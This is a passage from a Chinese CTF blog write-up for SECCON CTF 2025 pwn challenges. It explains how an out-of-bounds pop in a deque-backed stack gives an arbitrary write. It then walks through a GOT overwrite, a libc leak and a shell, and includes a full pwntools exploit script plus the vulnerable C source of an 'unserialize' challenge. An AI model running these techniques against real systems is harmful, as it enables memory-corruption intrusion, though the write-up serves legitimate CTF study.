(指向新 Buffer 第一个位置)。 - **写入**: 将 `99` 写入 `0x2000`。 - **自增**: `cur` 变为 `0x2008`。 \u003e **注意**：这就解释了为什么 `std::stack` 扩容不需要拷贝旧数据。旧的 `0x1000` 那个 Buffer 动都没动，我们只是把“光标”移到了新的纸张上。 ------ ### 阶段 4: `pop()` (回退) 现在执行 `S.pop()`。我们需要移除刚才 push 的 `99`。 **操作步骤：** 1. **检测**: 检查 `_M_finish.cur` 是否等于 `_M_finish.first`。 - 当前 `cur` 是 `0x2008`，`first` 是 `0x2000`。不相等，说明当前 Buffer 里有东西。 2. **回退**: `_M_finish.cur` 减 8。 - `cur` 变回 `0x2000`。 3. **逻辑删除**: 此时 `cur` 指向 `99` 所在的位置，但在逻辑上它已经是“无效区域”了。下一次 push 会直接覆盖它。 ------ ### 阶段 5: 跨越边界的 `pop()` (释放 Buffer) 假设我们在新 Buffer 里只存了一个 `99`，现在 `pop` 掉了。再次执行 `S.pop()`（要删除上一个 Buffer 的最后一个元素）。 **操作步骤：** 1. **检测**: `_M_finish.cur` (`0x2000`) 等于 `_M_finish.first` (`0x2000`)。这意味着当前 Buffer 空了（或者说光标已经退到了边缘）。 2. **释放 (可选)**: 标准库可能会释放 `0x2000` 这块内存，或者为了性能先缓存着。假设释放了。 3. **回跳 (核心)**: - `node`: 回退一格，指向 `0x1000` 的 Map 条目。 - `first`: 变回 `0x1000`。 - `last`: 变回 `0x1040`。 - `cur`: **直接设为 `0x1040` (即 `last`)**。 4. **最终修正**: `cur` 减 8，变为 `0x1038`。 ### 总结：结构体字段的意义 对照你给的 `_Deque_iterator` 结构体： | 字段 | 含义 | 在 Stack 中的作用 | | ----------- | -------------- | ------------------------------------------------------------ | | **`cur`** | **当前光标** | `push` 时往这里写值并++；`pop` 时--。它是最高频变化的字段。 | | **`first`** | **当前块起点** | 用来判断 `pop` 时是否撞到了当前 Buffer 的“地板”。 | | **`last`** | **当前块终点** | 用来判断 `push` 时是否撞到了当前 Buffer 的“天花板”。 | | **`node`** | **Map 导航** | 当撞到天花板或地板时，通过这个二级指针去 `_M_map` 找下一个或上一个 Buffer 的地址。 | 这就是 `std::stack` 在内存层面的真实面目：**一个在多个断断续续的内存块之间跳跃的“光标”。** 接下来再给出claude code结合代码的回答，详细解释了pop\n让我一步步解释当对空栈执行 pop() 时发生了什么。 1. 初始状态：空的 deque 当 std::deque 初始化后为空时，内存布局如下： S (0x405320) 的 std_deque 结构: ┌─────────────────────────────────────────────────────────────┐ │ +0x00 _M_map │ 指向堆上分配的 map 数组 (如 0x4172b0) │ │ +0x08 _M_map_size │ map 数组大小 (通常为 8) │ ├─────────────────────┼───────────────────────────────────────┤ │ +0x10 start.cur │ ─┐ │ │ +0x18 start.first │ │ start 迭代器 │ │ +0x20 start.last │ │ │ │ +0x28 start.node │ ─┘ │ ├─────────────────────┼───────────────────────────────────────┤ │ +0x30 finish.cur │ ─┐ 关键！空栈时 cur == first │ │ +0x38 finish.first │ │ finish 迭代器 │ │ +0x40 finish.last │ │ │ │ +0x48 finish.node │ ─┘ 指向 map 数组中的某个 node │ └─────────────────────┴───────────────────────────────────────┘ 堆上的 map 数组 (假设在 0x4172b0): ┌──────────┬──────────┬──────────┬──────────┬─────┐ │ map[0] │ map[1] │ map[2] │ map[3] │ ... │ │ 0x4172b0 │ 0x4172b8 │ 0x4172c0 │ 0x4172c8 │ │ └──────────┴──────────┴──────────┴──────────┴─────┘ ↑ └── finish.node 可能指向这里 (map 的起始位置) 空栈的关键特征：finish.cur == finish.first 2. 调用链 用户输入: 2 │ ▼ main() 中的 S.pop() │ ▼ stack_pop() [0x401696] │ // 直接调用，没有任何检查！ ▼ deque_pop_back() [0x4018f4] 3. deque_pop_back() 的逻辑 [0x4018f4] void deque_pop_back(std_deque* this) { // 0x401915: cmp rdx, rax 比较 finish.cur 和 finish.first if (this-\u003e_M_finish.cur == this-\u003e_M_finish.first) { // 空栈时走这个分支！ // 0x401964: call deque_M_pop_back_aux_VULN deque_M_pop_back_aux_VULN(this); // 危险！ } else { // 正常情况：cur 向前移动 this-\u003e_M_finish.cur -= 1; // 减 8 字节 } } 问题：当栈为空时，cur == first，代码认为\"当前 buffer 已经用完，需要切换到前一个 buffer\"，但实际上根本没有前一个 buffer！ 4. deque_M_pop_back_aux_VULN() 的危险操作 [0x401e4c] 这是漏洞的核心： void deque_M_pop_back_aux_VULN(std_deque* this) { // 步骤1: 释放当前 buffer // 0x401e6f: call deque_M_deallocate_node _M_deallocate_node(this-\u003e_M_finish.first); // 步骤2: 计算新的 node 指针 —— 漏洞在这里！ // 0x401e80: mov rdx, [rdx+48h] ; 读取 finish.node // 0x401e84: sub rdx, 8 ; node 指针减 8 unsigned long** new_node = this-\u003e_M_finish.node - 1; // 步骤3: 用越界的 new_node 设置迭代器 // 0x401e8e: call deque_iterator_M_set_node _M_set_node(\u0026this-\u003e_M_finish, new_node); // 步骤4: 设置 cur // 0x401ea3: mov [rax+30h], rdx this-\u003e_M_finish.cur = this-\u003e_M_finish.last - 1; } 关键漏洞：finish.node - 1 会越界！ 之前: finish.node ──────► map[0] (0x4172b0) 之后: new_node = finish.node - 1 = 0x4172b0 - 8 = 0x4172a8 ◄─── 越界！指向 map 数组之前的内存！ 5. _M_set_node() 从越界地址读取 [0x4020ac] void _M_set_node(_Deque_iterator* this, unsigned long** new_node) { // 0x4020c9: mov [rax+18h], rdx this-\u003enode = new_node; // 保存越界的 node 指针 // 0x4020d1: mov rdx, [rax] ; 从 new_node 读取！ // 0x4020d8: mov [rax+8], rdx this-\u003efirst = *new_node; // 危险！从越界地址读取值作为 buffer 地址 // 0x4020f5: mov [rax+10h], rdx this-\u003elast = this-\u003efirst + 64; // buffer 大小 64 个元素 (512 字节) } 这里发生了什么： *new_node = *(0x4172a8) // 读取越界地址的内容 // 这个值会被当作新的 buffer 地址！ 6. 内存越界的具体情况 假设 map 数组分配在堆上，其前面可能是： - 堆的元数据 - 之前分配的对象 - 或者其他可预测的数据 内存布局示例: ┌─────────────────┐ │ ... 其他数据 ... │ 0x417298 ├─────────────────┤ │ 某个 8 字节值 │ 0x4172a0 ◄── new_node 可能指向这里 ├─────────────────┤ │ 堆 chunk 头 │ 0x4172a8 ◄── 或者这里 ├─────────────────┤ │ map[0] │ 0x4172b0 ◄── 原始 finish.node │ map[1] │ 0x4172b8 │ ... │ └─────────────────┘ 7. 利用：控制 finish.cur 经过上述操作后： finish.first = *new_node = 从越界地址读取的值 finish.last = finish.first + 512 finish.cur = finish.last - 8 如果攻击者能控制越界地址处的值（比如通过 name 字符串或堆喷射），就能控制 finish.cur！ 8. 后续 push() 实现任意写 当执行 push(value) 时： void deque_push_back(std_deque* this, unsigned long* value) { // 0x4018bf: mov [rbx], rax *this-\u003e_M_finish.cur = *value; // 写入 finish.cur 指向的地址！ // 0x4018d4: mov [rax+30h], rdx this-\u003e_M_finish.cur += 1; } 如果 finish.cur 被控制为 GOT 表地址： finish.cur = 0x405028 (operator delete 的 GOT 条目) push(system_addr) ↓ *0x405028 = system_addr // GOT 表被覆写！ 再来一份push代码详解释\n// deque_push_back [0x401832] // 参数: rdi = deque 指针, rsi = 要 push 的值的指针 void deque_push_back(std_deque* this, size_t* value) { // ═══════════════════════════════════════════════════════════════ // 步骤 1: 检查当前 buffer 是否还有空间 // ═══════════════════════════════════════════════════════════════ // 0x40184b: mov rdx, [rax+30h] ; rdx = finish.cur // 0x401853: mov rax, [rax+40h] ; rax = finish.last // 0x401857: sub rax, 8 ; rax = finish.last - 8 // 0x40185b: cmp rdx, rax ; 比较 finish.cur 和 finish.last - 8 // 0x40185e: jz loc_4018DA ; 如果相等，buffer 满了，跳转到 aux 函数 if (this-\u003e_M_finish.cur == this-\u003e_M_finish.last - 1) { // Buffer 已满，需要分配新的 buffer _M_push_back_aux(this, value); return; } // ═══════════════════════════════════════════════════════════════ // 步骤 2: 正常情况 - 直接写入 finish.cur 指向的位置 // ═══════════════════════════════════════════════════════════════ // 0x401864: mov rax, [rax+30h] ; rax = finish.cur (写入目标地址) // 0x4018a8: call _ZnwmPv ; placement new (实际上就是返回 finish.cur) // 0x4018bc: mov rax, [rax] ; rax = *value (要写入的值) // 0x4018bf: mov [rbx], rax ; *finish.cur = value ← 关键写入操作! *this-\u003e_M_finish.cur = *value; // 将值写入 finish.cur 指向的地址 // ═══════════════════════════════════════════════════════════════ // 步骤 3: 更新 finish.cur 指针 // ═══════════════════════════════════════════════════════════════ // 0x4018c8: mov rax, [rax+30h] ; rax = finish.cur // 0x4018cc: lea rdx, [rax+8] ; rdx = finish.cur + 8 // 0x4018d4: mov [rax+30h], rdx ; finish.cur = finish.cur + 8 this-\u003e_M_finish.cur += 1; // 移动到下一个位置 (+8 bytes) } 5. Push 操作的图示 执行 S.push(0xCAFEBABE) 前: ═══════════════════════════════════════════════════════════════════ finish.cur = 0x29837308 │ ▼ ┌────────────┬────────────┬────────────┬────────────┐ │ 0xdeadbeef │ 0x00000000 │ 0x00000000 │ ... │ S.buffer └────────────┴────────────┴────────────┴────────────┘ 0x29837300 0x29837308 0x29837310 ▲ │ finish.first 执行 S.push(0xCAFEBABE) 后: ═══════════════════════════════════════════════════════════════════ finish.cur = 0x29837310 (已更新) │ ▼ ┌────────────┬────────────┬────────────┬────────────┐ │ 0xdeadbeef │ 0xCAFEBABE │ 0x00000000 │ ... │ S.buffer └────────────┴────────────┴────────────┴────────────┘ 0x29837300 0x29837308 0x29837310 ▲ ▲ │ │ finish.first 写入位置 6. 漏洞利用时的 Push 当 finish.cur 被控制为 GOT 表地址时： 假设通过空栈 pop 漏洞，finish.cur 被设置为 0x405028 (GOT 表) 执行 S.push(system_addr): ═══════════════════════════════════════════════════════════════════ finish.cur = 0x405028 (被控制的地址) │ ▼ ┌────────────────────────────────────────────────────────────────┐ │ GOT 表 │ │ ... │ │ 0x405028: [operator delete] = 0x7ffff7xxxxxx (原始 libc 地址) │ │ ... │ └────────────────────────────────────────────────────────────────┘ 执行 *finish.cur = system_addr 后: ═══════════════════════════════════════════════════════════════════ ┌────────────────────────────────────────────────────────────────┐ │ GOT 表 │ │ ... │ │ 0x405028: [operator delete] = system_addr ← 被覆写! │ │ ... │ └────────────────────────────────────────────────────────────────┘ 之后任何调用 operator delete 的操作都会执行 system()! push操作不用理解很深刻，在这道题只需要知道push的时候，buffer不够了是先分配再调整指针，写值即可，还有就是map不够了也是会重新分配一片更大的内存\n如果最开始只pop是不行的，虽然可以越界\nfor i in range(64): T_pop() for i in range(64): T_pop() for i in range(64): T_pop() pause() \"\"\" 0x405380 : 0x0000000032a1e510(**_M_map) 0x0000000000000008 0x405390 : 0x0000000032a1e560 0x0000000032a1e560 0x4053a0 : 0x0000000032a1e760 0x0000000032a1e528 0x4053b0 : 0x0000000000000000 0x0000000000000000 0x4053c0 : 0x0000000000000200 0x0000000032a1e510(_M_finish-\u003enode) \"\"\" #THE NEXT T_pop() WILL BACK OVERFLOW _M_map T_pop() \"\"\" 0x405380 : 0x0000000032a1e510(**_M_map) 0x0000000000000008 0x405390 : 0x0000000032a1e560 0x0000000032a1e560 0x4053a0 : 0x0000000032a1e760 0x0000000032a1e528 0x4053b0 : 0x0000000000000249 0x0000000000000051 0x4053c0 : 0x0000000000000251 0x0000000032a1e508(_M_finish-\u003enode) \"\"\" 但是再越界就会触发free heap head，\nfor i in range(64): T_pop() for i in range(64): T_pop() for i in range(64): T_pop() \"\"\" 0x405380 : 0x0000000032a1e510(**_M_map) 0x0000000000000008 0x405390 : 0x0000000032a1e560 0x0000000032a1e560 0x4053a0 : 0x0000000032a1e760 0x0000000032a1e528 0x4053b0 : 0x0000000000000000 0x0000000000000000 0x4053c0 : 0x0000000000000200 0x0000000032a1e510(_M_finish.node) \"\"\" #T_pop() #THE NEXT T_pop() WILL BACK OVERFLOW _M_map \"\"\" 0x405380 : 0x0000000032a1e510(**_M_map) 0x0000000000000008 0x405390 : 0x0000000032a1e560 0x0000000032a1e560 0x4053a0 : 0x0000000032a1e760 0x0000000032a1e528 0x4053b0 : 0x0000000000000249 0x0000000000000051 0x4053c0 : 0x0000000000000251 0x0000000032a1e508(_M_finish.node) \"\"\" #BUT THE HEAP_SIZE IS NO USE, SO KEEP GOING for i in range(64): T_pop() #THE NEXT T_pop() WILL CRASH #BECAUSE _M_finish-\u003ecur == _M_finish-\u003efirst \"\"\" if (this-\u003e_M_finish.cur == this-\u003e_M_finish.first) { // 0x401964: call deque_M_pop_back_aux_VULN deque_M_pop_back_aux_VULN(this); void deque_M_pop_back_aux_VULN(std_deque* this) { // 0x401e6f: call deque_M_deallocate_node _M_deallocate_node(this-\u003e_M_finish.first);############# we can't free 0x0000000000000051 // 0x401e80: mov rdx, [rdx+48h] // 0x401e84: sub rdx, 8 unsigned long** new_node = this-\u003e_M_finish.node - 1; // 0x401e8e: call deque_iterator_M_set_node _M_set_node(\u0026this-\u003e_M_finish, new_node); // 0x401ea3: mov [rax+30h], rdx this-\u003e_M_finish.cur = this-\u003e_M_finish.last - 1; } \"\"\" \"\"\" 0x405380 : 0x000000003e43d510 0x0000000000000008 0x405390 : 0x000000003e43d560 0x000000003e43d560 0x4053a0 : 0x000000003e43d760 0x000000003e43d528 0x4053b0 : 0x0000000000000051(_M_finish.cur) 0x0000000000000051(_M_finish.first) 0x4053c0 : 0x0000000000000251 0x000000003e43d508 \"\"\" 所以我们肯定的先push，接下来有一个很关键的地方。**map大小不够重新分配时，不会清空原来堆内存里的残留数据，并且他是从中间开始往后写（毕竟底层是deque，还要为前面预留空间，只是对于stack来说不需要）\n所以可以通过堆风水造成这样的布局\n这时pop溢出后cur指针就不会先变成0x51这样的chunk头了（不知道在说什么的再回看前面的代码段，里面有展示cur指针为0x51），而是会先变成我们可控的地址，所以可以造成任意地址写（但是只能指定一次地址，可以自己思考为什么）\n比赛完在discord交流时发现，其实没必要进行堆风水，最开始在输入name时如果输0x800个A，会导致一个unsorted bin，所以可以直接布置一个地址上去。\n那么，我们要写什么地方呢？\n答案是写另一个stack的cur指针，比如我们通过stack S写stack T的cur指针，那么就可以通过T push进行任意地址写，写完再通过stack S控制stack T的cur指针，这样就可以造成无限的任意地址写。\n有了任意地址写，如何get shell，我们还没有libc，我们需要leak libc。\n利用任意地址写，将std::string的char* _M_p;写为got表地址，再将operator new的got写为\nstd::cout \u003c\u003c \"Hello, \" \u003c\u003c name \u003c\u003c \"!\" \u003c\u003c std::endl; 地址（为什么写operator new而不是exit？因为这道题没有exit的got表……）\n利用S push触发malloc回到main即可泄露libc（仔细看源码你会发现，他是先malloc再调整指针写数据，触发malloc就回到main函数了，没有调整指针写数据的环节，所以不会影响接下来的任意写）\n继续利用任意地址写，往一个bss地址写入/bin/sh，再将operator delete写为system\n接着利用stack S将stack T的cur和first指针都写为bss地址，进行一次T pop即可触发operator delete(bss)，也就是system(/bin/sh)\n此时发现栈没对齐，system失败了，于是再在之前增加一步，再触发一次malloc跳回\nstd::cout \u003c\u003c \"Hello, \" \u003c\u003c name \u003c\u003c \"!\" \u003c\u003c std::endl; 达到调整栈帧的目的，再执行system(/bin/sh)即可\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = \"st\" + \"_patched\" libcname = \"/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.5/amd64/libc6_2.39-0ubuntu8.5_amd64/usr/lib/x86_64-linux-gnu/libc.so.6\" host = \"st.seccon.games\" port = 5000 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.5/amd64/libc6-dbg_2.39-0ubuntu8.5_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.5/amd64/glibc-source_2.39-0ubuntu8.5_all/usr/src/glibc/glibc-2.39 ''' def base(name, data, offset): if isinstance(data, bytes): if name == \"canary\": base = u64(data) else: base = u64(data + b'\\x00' * 2) - offset elif isinstance(data, int): base = data - offset log.success(f\"{name} = \" + hex(base)) return base def format_extract(data): return re.search(b'0x[0-9a-fA-F]{12}', data).group(1) def sa(io, a, b): io.sendafter(a, b) def sla(io, a, b): io.sendlineafter(a, b) def ru(io, a): io.recvuntil(a) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) def fill_stack(stack_name, data): global s_idx global t_idx if (stack_name == 'S'): for i in range(64): S_push(data) s_idx += 64 else: for i in range(64): T_push(data) t_idx += 64 def pop_stack(stack_name): global s_idx global t_idx if (stack_name == 'S'): for i in range(64): S_pop() s_idx -= 64 else: for i in range(64): T_pop() t_idx -= 64 def S_push(v): #sleep(0.01) io.sendline(str(1)) #sleep(0.01) io.sendline(str(v)) def S_pop(): #sleep(0.01) io.sendline(str(2)) def T_push(v): #sleep(0.01) io.sendline(str(3)) #sleep(0.01) io.sendline(str(v)) def T_pop(): #sleep(0.01) io.sendline(str(4)) \"\"\" // Deque 迭代器结构 (0x20 bytes) struct _Deque_iterator { unsigned long *cur; // +0x00: 当前位置指针 unsigned long *first; // +0x08: buffer 起始 unsigned long *last; // +0x10: buffer 结束 unsigned long **node; // +0x18: map 中的 node 指针 }; // Deque 主结构 (0x60 bytes) struct std_deque { unsigned long **_M_map; // +0x00: map 数组指针 unsigned long _M_map_size; // +0x08: map 大小 struct _Deque_iterator _M_start; // +0x10: 起始迭代器 struct _Deque_iterator _M_finish; // +0x30: 结束迭代器 }; \"\"\" s_idx = 0 t_idx = 0 name_addr = 0x0000000000405300 S_addr = 0x0000000000405320 T_addr = 0x0000000000405380 atexit_addr = 0x0000000000405020 main_addr = 0x401376 libc_start_main_got = 0x404FD8 delete_addr = 0x405040 new_got = 0x405038 cout_addr = 0x4013D5 io = start() name = b'A' * 0x20 sla(io, \"What's your name?\\n\", name) for i in range(25): fill_stack('S', 0x1337) for i in range(13): fill_stack('T', 0xdeadbeef) for i in range(32): T_push(0xcafebabe) for i in range(4): T_push(0xAAAAAAAA) for i in range(20): T_push(0xffffffff) ##################control T_push(T_addr - 0x1f8 + 0x30 + 0x10) for i in range(7): T_push(0xcccccccc) for i in range(32): T_push(0xdeadbeef) for i in range(14): pop_stack('T') fill_stack('S', 0x1337) for i in range(14): pop_stack('S') for i in range(12): pop_stack('S') S_pop() S_pop() #arbitrary write S_pop() S_push(name_addr) T_push(libc_start_main_got) #arbitrary write S_pop() S_push(new_got) T_push(cout_addr) S_push(0x405000) S_push(0xffffffff) #trigger malloc io.recvuntil(\"Hello, \") io.recvuntil(\"Hello, \") libc_base = base(\"libc_base\", io.recv(6), 0x2a200) S_pop() S_pop() #arbitrary write S_pop() S_push(delete_addr) T_push(libc_base + libc.sym['system']) bss = 0x405500 #arbitrary write #S_pop() #S_push(bss) #T_push(u64(b'/bin/sh\\x00')) S_push(bss) S_push(bss) S_push(bss) S_pop() S_pop() S_pop() S_push(bss) T_push(u64(b'/bin/sh\\x00')) S_push(bss) S_push(bss) T_pop() io.interactive() ","wordCount":"3629","inLanguage":"en","image":"https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-12-15T23:00:24+08:00","dateModified":"2025-12-15T23:00:24+08:00","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wgggggggg.github.io/posts/ctf/secconctf2025-writeup/"},"publisher":{"@type":"Organization","name":"Wgg's Blog Site","logo":{"@type":"ImageObject","url":"https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://wgggggggg.github.io/ accesskey=h title="Wgg (Alt + H)"><img src=https://wgggggggg.github.io/apple-touch-icon.png alt aria-label=logo height=35>Wgg</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://wgggggggg.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://wgggggggg.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://example.org title=example.org><span>example.org</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://wgggggggg.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://wgggggggg.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">secconCTF2025 PWN Writeup'</h1><div class=post-meta><span title='2025-12-15 23:00:24 +0800 CST'>December 15, 2025</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;3629 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/CTF/secconCTF2025-WriteUp/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h1 id=secconctf-2025-pwn-writeup>secconCTF 2025 PWN Writeup<a hidden class=anchor aria-hidden=true href=#secconctf-2025-pwn-writeup>#</a></h1><h2 id=unserialize>unserialize<a hidden class=anchor aria-hidden=true href=#unserialize>#</a></h2><p>题目源码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;ctype.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>unserialize</span><span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>szbuf</span><span class=p>[</span><span class=mh>0x20</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>tmpbuf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>szbuf</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>szbuf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nf>fgetc</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>szbuf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=sc>&#39;:&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>szbuf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>isdigit</span><span class=p>(</span><span class=n>szbuf</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>||</span> <span class=n>i</span> <span class=o>==</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>szbuf</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>atoi</span><span class=p>(</span><span class=n>szbuf</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>tmpbuf</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=nf>alloca</span><span class=p>(</span><span class=nf>strtoul</span><span class=p>(</span><span class=n>szbuf</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>sz</span> <span class=o>=</span> <span class=nf>strtoul</span><span class=p>(</span><span class=n>szbuf</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>sz</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>fscanf</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=s>&#34;%02hhx&#34;</span><span class=p>,</span> <span class=n>tmpbuf</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>tmpbuf</span><span class=p>,</span> <span class=n>sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>sz</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>unserialize</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;[-] Deserialization faield&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;[+] Deserialization success&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
